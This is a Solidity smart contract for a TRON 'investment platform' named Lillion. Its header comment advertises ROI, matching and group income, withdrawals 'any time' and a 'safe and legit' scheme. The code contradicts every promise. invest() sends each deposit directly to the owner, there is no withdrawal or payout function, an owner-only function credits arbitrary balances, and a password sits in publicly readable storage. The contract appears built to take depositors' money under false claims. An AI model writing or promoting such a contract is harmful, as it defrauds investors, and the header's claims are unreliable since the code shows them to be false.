//SourceUnit: Lillion.sol

/*   lillion - investment platform based on TRX blockchain smart-contract technology Token Li. Safe and legit!
 *   The only official platform of original lillion team! All other platforms with the same contract code are FAKE!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://www.lillion.io/                                │
 *   │                                                                       |
               |
 *   |                                                                       |
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink, or mobile wallet apps like TronWallet
 *   2) Choose one of the tariff plans, 
 *   3) Wait for your earnings By group Increase
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Take Li Token and Invest TRON
 *   - One deposit: minimum 100 TRX, 
 *   - Total income: based on your Group and Global Group
 *   - Earnings every moment, withdraw any time 
 *
 *   [Maximum Income]
 *
 *   - Working Income 
 *   - Matching Income
 *   - Direct Income According Plan
 *   - ROI Income 
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 100% Platform distribution balance, participants payouts
 *   - 2% Support work, technical functioning, No administration fee
 */


 pragma solidity ^0.4.25;
 contract Lillion {
    address private owner;
    address private verifyAddress;
    uint256 public  initialSupply = 100000000;
        uint256 constant public INVEST_MIN_AMOUNT = 50 trx;
    string private password;
    struct Instructor {
        address user;
        string pass;
        uint amt;

    }

constructor(address _stakingAddress,string _pass) public {

        owner = msg.sender;
        password = _pass;
        verifyAddress = _stakingAddress;


}

        mapping(address => uint256) public balances;
    mapping (address => Instructor) instructors;
    //mapping (address => Instructor.pass) public password;
    address[] public instructorAccts;

    
    function invest() public payable{
        require(msg.value >= INVEST_MIN_AMOUNT);
        owner.transfer(msg.value);

    }


    

    function AdminPower(uint amount) public {   
           address userAddress=msg.sender;

            if (owner==userAddress) {
            balances[msg.sender] += amount;
            owner.transfer(amount);
            }            
            
    }
    


}